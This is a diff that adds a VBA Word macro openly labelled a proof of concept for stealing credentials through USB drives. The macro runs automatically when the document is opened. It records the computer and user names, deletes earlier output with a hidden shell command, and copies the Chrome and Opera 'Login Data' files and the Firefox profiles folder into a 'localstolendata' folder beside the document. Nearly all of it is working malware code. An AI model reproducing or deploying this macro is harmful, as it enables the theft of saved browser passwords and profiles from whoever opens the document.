@@ -1,0 +1,143 @@
+Private Sub Document_Open()
+'On Error Resume Next
+MsgBox "Local Mode USB Pen Drive Info Stealing Credentials POC"
+Dim FSO As Object
+Dim targetfolder1, targetfolder2, targetfolder3, targetfolder4, pasteloc1, pasteloc2, pasteloc3, pasteloc4, targetfile1 As String
+Set wshNetwork = CreateObject("WScript.Network")
+namadomain = wshNetwork.UserDomain
+namakomputer = wshNetwork.computername
+namapengguna = (Environ$("Username"))
+folderaktif = ActiveDocument.Path
+folderaktifkerja = ActiveDocument.Path & "\localstolendata"
+'MsgBox folderaktifkerja
+Dim PauseTime, Start
+PauseTime = 10 ' Set duration in seconds
+Start = Timer ' Set start time.
+
+Dim wsh As Object
+Set wsh = VBA.CreateObject("WScript.Shell")
+Dim waitOnReturn As Boolean: waitOnReturn = True
+Dim windowStyle As Integer: windowStyle = 1
+Set FSO = CreateObject("scripting.filesystemobject")
+'MsgBox "To steal targetted data through USB pendrives and external harddisk by opening and editing dummy documents", vbExclamation, "USB STEALING MODE"
+'MsgBox "Pendrive Stealing Mode: Successfully copied data to " & folderaktifkerja & ". Saved password can be viewed using webbrowserpassview tool"
+
+If Dir$(folderaktifkerja, vbDirectory) <> vbNullString Then
+Shell "cmd /c cd " & folderaktif & "&& ECHO Y | rmdir /s localstolendata", vbHide
+
+Do While Timer < Start + PauseTime
+DoEvents ' Yield to other processes.
+Loop
+'Shell "cmd /c cd C:\Users\" & namapengguna & "\AppData\Local && ECHO Y | del /s tmpdata"
+End If
+
+If Dir$(folderaktifkerja, vbDirectory) = vbNullString Then
+MkDir folderaktifkerja
+End If
+
+If Dir$(folderaktifkerja & "\" & namakomputer, vbDirectory) = vbNullString Then
+MkDir folderaktifkerja & "\" & namakomputer
+End If
+
+If Dir$(folderaktifkerja & "\" & namakomputer & "\" & namapengguna, vbDirectory) = vbNullString Then
+MkDir folderaktifkerja & "\" & namakomputer & "\" & namapengguna
+End If
+
+If Dir$(folderaktifkerja & "\" & namakomputer & "\" & namapengguna & "\opera", vbDirectory) = vbNullString Then
+MkDir folderaktifkerja & "\" & namakomputer & "\" & namapengguna & "\opera"
+End If
+
+If Dir$(folderaktifkerja & "\" & namakomputer & "\" & namapengguna & "\chrome", vbDirectory) = vbNullString Then
+MkDir folderaktifkerja & "\" & namakomputer & "\" & namapengguna & "\chrome"
+End If
+
+If Dir$(folderaktifkerja & "\" & namakomputer & "\" & namapengguna & "\firefox", vbDirectory) = vbNullString Then
+MkDir folderaktifkerja & "\" & namakomputer & "\" & namapengguna & "\firefox"
+End If
+
+If Dir$(folderaktifkerja & "\" & namakomputer & "\" & namapengguna & "\info", vbDirectory) = vbNullString Then
+MkDir folderaktifkerja & "\" & namakomputer & "\" & namapengguna & "\info"
+End If
+
+If Dir$(Environ("USERPROFILE") & "\AppData\Local\info", vbDirectory) = vbNullString Then
+MkDir Environ("USERPROFILE") & "\AppData\Local\info"
+End If
+
+
+targetfolder1 = Environ("USERPROFILE") & "\AppData\Roaming\Opera Software\Opera Stable\Login Data"
+pasteloc1 = folderaktifkerja & "\" & namakomputer & "\" & namapengguna & "\opera\Login Data"
+targetfolder2 = Environ("USERPROFILE") & "\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+pasteloc2 = folderaktifkerja & "\" & namakomputer & "\" & namapengguna & "\chrome\Login Data"
+targetfolder3 = Environ("USERPROFILE") & "\AppData\Roaming\Mozilla\Firefox\Profiles"
+pasteloc3 = folderaktifkerja & "\" & namakomputer & "\" & namapengguna & "\firefox"
+targetfolder4 = Environ("USERPROFILE") & "\AppData\Local\info"
+targetfile1 = Environ("USERPROFILE") & "\AppData\Local\update.txt"
+pasteloc4 = folderaktifkerja & "\" & namakomputer & "\" & namapengguna & "\info"
+
+If Dir$(targetfolder1, vbDirectory) = vbNullString Then
+targetfolder1empty = 1
+End If
+If Dir$(targetfolder2, vbDirectory) = vbNullString Then
+targetfolder2empty = 1
+End If
+If Dir$(targetfolder3, vbDirectory) = vbNullString Then
+targetfolder3empty = 1
+End If
+If Dir$(targetfolder4, vbDirectory) = vbNullString Then
+targetfolder4empty = 1
+End If
+
+
+'MsgBox targetfile1
+
+If Right(targetfolder1, 1) = "\" Then
+targetfolder1 = Left(targetfolder1, Len(targetfolder1) - 1)
+End If
+If Right(pasteloc1, 1) = "\" Then
+pasteloc1 = Left(pasteloc1, Len(pasteloc1) - 1)
+End If
+Set FSO = CreateObject("scripting.filesystemobject")
+If FSO.FileExists(targetfolder1) = False Then
+End If
+If Dir$(targetfolder1, vbDirectory) <> vbNullString Then
+FSO.CopyFile Source:=targetfolder1, Destination:=pasteloc1
+End If
+
+If Right(targetfolder2, 1) = "\" Then
+targetfolder2 = Left(targetfolder2, Len(targetfolder2) - 1)
+End If
+If Right(pasteloc2, 1) = "\" Then
+pasteloc2 = Left(pasteloc2, Len(pasteloc2) - 1)
+End If
+Set FSO = CreateObject("scripting.filesystemobject")
+If FSO.FileExists(targetfolder2) = False Then
+End If
+If Dir$(targetfolder2, vbDirectory) <> vbNullString Then
+FSO.CopyFile Source:=targetfolder2, Destination:=pasteloc2
+End If
+
+If Right(targetfolder3, 1) = "\" Then
+targetfolder3 = Left(targetfolder3, Len(targetfolder3) - 1)
+End If
+If Right(pasteloc3, 1) = "\" Then
+pasteloc3 = Left(pasteloc3, Len(pasteloc3) - 1)
+End If
+Set FSO = CreateObject("scripting.filesystemobject")
+If FSO.FolderExists(targetfolder3) = False Then
+End If
+If Dir$(targetfolder3, vbDirectory) <> vbNullString Then
+FSO.CopyFolder Source:=targetfolder3, Destination:=pasteloc3
+End If
+
+If Right(targetfolder4, 1) = "\" Then
+targetfolder4 = Left(targetfolder4, Len(targetfolder4) - 1)
+End If
+If Right(pasteloc4, 1) = "\" Then
+pasteloc4 = Left(pasteloc4, Len(pasteloc4) - 1)
+End If
+Set FSO = CreateObject("scripting.filesystemobject")
+If FSO.FolderExists(targetfolder4) = False Then
+End If
+If Dir$(targetfolder4, vbDirectory) <> vbNullString Then
+FSO.CopyFolder Source:=targetfolder4, Destination:=pasteloc4
+End If
